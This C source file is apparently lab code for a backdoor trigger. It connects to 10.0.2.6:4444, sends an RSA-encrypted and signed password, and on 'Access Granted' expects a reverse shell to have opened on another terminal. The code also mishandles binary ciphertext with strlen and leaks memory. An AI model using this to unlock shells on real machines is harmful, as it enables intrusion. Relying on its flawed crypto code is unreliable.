#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <assert.h>
#include <stdbool.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <openssl/x509.h>
#include <sys/prctl.h>
#include <stdbool.h>

#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <assert.h>


#define PORT 4444
#define SERVER_IP "10.0.2.6"
#define SIGNATURE_SIZE 256
#define BUFFER_SIZE 10000

const char* PRIVATE_KEY_LOC = "./private.pem";

const char* PUBLIC_KEY =
"-----BEGIN PUBLIC KEY-----\n"
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjn8akaXhU4d7TBpBpbra\n"
"pwg4OoP6rAFh1vc/1D2LmMNTgAJ83qo7QJtOYUwn+DtF7oZukgT/+v7Id4QFsW+y\n"
"cEmP2wzbw9lgoGnbOvd3EHqFpO9H6TKnSId1cCs55kxELDp6r8lgqeRRhKLVfdIx\n"
"DgFXMbUYl6uKyLLZdtGEpJKwrG6bWL9vZGZBALMgRXVNFGjTw+kZ9RWGYZMVrsHv\n"
"nTHAkQgqOOvutFRr9Mhit7LMZvKboYzCkUNDMPPS40DPDiG9ugYXsEkaGoXPvknm\n"
"6xAvY0mV6vzH5yrAWee/+amf7kRJFW1upcWFzaCeIL0/hkgxQwYWrCoHYggqzDK3\n"
"vQIDAQAB\n"
"-----END PUBLIC KEY-----\n";

const char* enc_pub_key = "-----BEGIN PUBLIC KEY-----\n"
"MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFvF+v1kshtsUpXO9Z1J+aFJA7tl\n"
"x8KQkcY/NyPB0RLTJtdCkvKOk+hOxqrocNZwKcSEx764U4ZtAzYqE3DWdhsESoYB\n"
"/m/V6cMg0QYrxfvXH5tq2Q9wjbad9G88fQ73YvMjsyEeD4VLgtGG+qi+2b2mQRbF\n"
"B30jgtLhjJ867fjBAgMBAAE=\n"
"-----END PUBLIC KEY-----\n";





RSA* createPrivateRSA() {
    RSA *rsa = NULL;
    FILE *keyfile = fopen(PRIVATE_KEY_LOC, "r");
    if (keyfile == NULL) {
        fprintf(stderr, "Error opening private key file: %s\n", PRIVATE_KEY_LOC);
        return NULL;
    }
    rsa = PEM_read_RSAPrivateKey(keyfile, &rsa, NULL, NULL);
    fclose(keyfile);
    return rsa;
}

  
RSA* createPublicRSA() {
  RSA *rsa = NULL;
  BIO *keybio;
  keybio = BIO_new_mem_buf(enc_pub_key, -1);
  if (keybio == NULL) {
    return NULL;
  }
  rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa, NULL, NULL);
  return rsa;
}
  
  int Encrypt(char* src, char* dst){
    int encrypt_len = 0;
    RSA* privateRSA = createPublicRSA(); 
    // err = malloc(130);
    if((encrypt_len = RSA_public_encrypt(strlen(src)+1, (unsigned char*)src,
      (unsigned char*)dst, privateRSA, RSA_PKCS1_OAEP_PADDING)) == -1) {
        // ERR_load_crypto_strings();
        // ERR_error_string(ERR_get_error(), err);
        // fprintf(stderr, "Error encrypting message: %s\n", err);
        printf("bad");
    }
    // free(err);
    return encrypt_len;
  }



  int RSASign(RSA* rsa, const unsigned char* Msg, size_t MsgLen, unsigned char** EncMsg, size_t* MsgLenEnc) {
    EVP_MD_CTX* m_RSASignCtx = EVP_MD_CTX_create();
    EVP_PKEY* priKey  = EVP_PKEY_new();
    EVP_PKEY_assign_RSA(priKey, rsa);
    
    if (EVP_DigestSignInit(m_RSASignCtx, NULL, EVP_sha256(), NULL, priKey) <= 0) {
      return 0;
    }
    if (EVP_DigestSignUpdate(m_RSASignCtx, Msg, MsgLen) <= 0) {
      return 0;
    }
    if (EVP_DigestSignFinal(m_RSASignCtx, NULL, MsgLenEnc) <= 0) {
      return 0;
    }
    *EncMsg = (unsigned char*)malloc(*MsgLenEnc);
    if (EVP_DigestSignFinal(m_RSASignCtx, *EncMsg, MsgLenEnc) <= 0) {
      return 0;
    }
    EVP_MD_CTX_free(m_RSASignCtx);
    return 1;
  }
  
  int RSAVerifySignature(RSA* rsa, unsigned char* MsgHash, size_t MsgHashLen, const char* Msg, size_t MsgLen, int* Authentic) {
    *Authentic = 0;
    EVP_PKEY* pubKey = EVP_PKEY_new();
    EVP_PKEY_assign_RSA(pubKey, rsa);
    EVP_MD_CTX* m_RSAVerifyCtx = EVP_MD_CTX_create();
  
    if (EVP_DigestVerifyInit(m_RSAVerifyCtx, NULL, EVP_sha256(), NULL, pubKey) <= 0) {
      return 0;
    }
    if (EVP_DigestVerifyUpdate(m_RSAVerifyCtx, Msg, MsgLen) <= 0) {
      return 0;
    }
    int AuthStatus = EVP_DigestVerifyFinal(m_RSAVerifyCtx, MsgHash, MsgHashLen);
    if (AuthStatus == 1) {
      *Authentic = 1;
    } else {
      *Authentic = 0;
    }
    EVP_MD_CTX_free(m_RSAVerifyCtx);
    return 1;
  }
  
  void Base64Encode(const unsigned char* buffer, size_t length, char** base64Text) {
    BIO *bio, *b64;
    BUF_MEM *bufferPtr;
  
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
  
    BIO_write(bio, buffer, length);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bufferPtr);
    BIO_set_close(bio, BIO_NOCLOSE);
    BIO_free_all(bio);
  
    *base64Text = (char*)(*bufferPtr).data;
  }
  
  size_t calcDecodeLength(const char* b64input) {
    size_t len = strlen(b64input), padding = 0;
  
    if (b64input[len - 1] == '=' && b64input[len - 2] == '=') // last two chars are =
      padding = 2;
    else if (b64input[len - 1] == '=') // last char is =
      padding = 1;
    return (len * 3) / 4 - padding;
  }
  
  void Base64Decode(const char* b64message, unsigned char** buffer, size_t* length) {
    BIO *bio, *b64;
  
    int decodeLen = calcDecodeLength(b64message);
    *buffer = (unsigned char*)malloc(decodeLen + 1);
    (*buffer)[decodeLen] = '\0';
  
    bio = BIO_new_mem_buf(b64message, -1);
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_push(b64, bio);
  
    *length = BIO_read(bio, *buffer, strlen(b64message));
    BIO_free_all(bio);
  }
  
  char* signMessage(const char* plainText) {
    RSA* privateRSA = createPrivateRSA(); 
    unsigned char* encMessage;
    char* base64Text;
    size_t encMessageLength;
    RSASign(privateRSA, (unsigned char*)plainText, strlen(plainText), &encMessage, &encMessageLength);
    Base64Encode(encMessage, encMessageLength, &base64Text);
    free(encMessage);
    return base64Text;
  }
  
  int verifySignature(const char* plainText, char* signatureBase64) {
    RSA* publicRSA = createPublicRSA();
    unsigned char* encMessage;
    size_t encMessageLength;
    int authentic;
    Base64Decode(signatureBase64, &encMessage, &encMessageLength);
    int result = RSAVerifySignature(publicRSA, encMessage, encMessageLength, plainText, strlen(plainText), &authentic);
    return result && authentic;
  }
  
  int main() {
    char pwd[BUFFER_SIZE];
    char* signature;
    int signature_len;
    int client_socket;
    struct sockaddr_in server_addr;

    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if(client_socket < 0){
        perror("Socket creation failed");
        return EXIT_FAILURE;
    }
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(client_socket);
        return EXIT_FAILURE;
    }
    printf("Enter password: ");
    while (1) {
        if (fgets(pwd, BUFFER_SIZE, stdin) == NULL) {
            perror("Failed to read pwd");
            break;
        }

        if(strcmp(pwd, "exit")==0 || strcmp(pwd ,"exit\n") == 0){
            break;
        }

        unsigned char Encrypted_pass[BUFFER_SIZE];
        memset(Encrypted_pass, '\0', BUFFER_SIZE);
        int enc_len = Encrypt(pwd, Encrypted_pass);

        signature = signMessage((unsigned char *)Encrypted_pass);
        signature_len = strlen(signature);
        if (signature_len < 0) {
            break;
        }


        if (send(client_socket, &signature_len, sizeof(int), 0) < 0) {
            perror("Failed to send signature length");
            break;
        }

        if (send(client_socket, signature, signature_len, 0) < 0) {
            perror("Failed to send signature");
            break;
        }

        

        int pwd_len = strlen(Encrypted_pass);
        if(send(client_socket, &enc_len, sizeof(int), 0)<0){
            perror("faield to send cmd len");
            break;
        }
        if (send(client_socket, Encrypted_pass, enc_len, 0) < 0) {
            perror("Failed to send pwd");
            break;
        }

        
        // printf("Signature: %s\n---\nEncryption: %s\n---\nDecryption: %s\nLen: %d\n", signature, Encrypted_pass, pwd, enc_len);


        unsigned char response_buffer[BUFFER_SIZE];
        int response_len = recv(client_socket, response_buffer, BUFFER_SIZE, 0);
        
        response_buffer[response_len] = '\0';
        printf("%s\n", response_buffer);
        if(strcmp(response_buffer, "Access Granted\n") == 0){
          printf("The other terminal should be a reverse shell now?");
          close(client_socket);
          exit(0);
        }
    }

    close(client_socket);
    return 0;
  }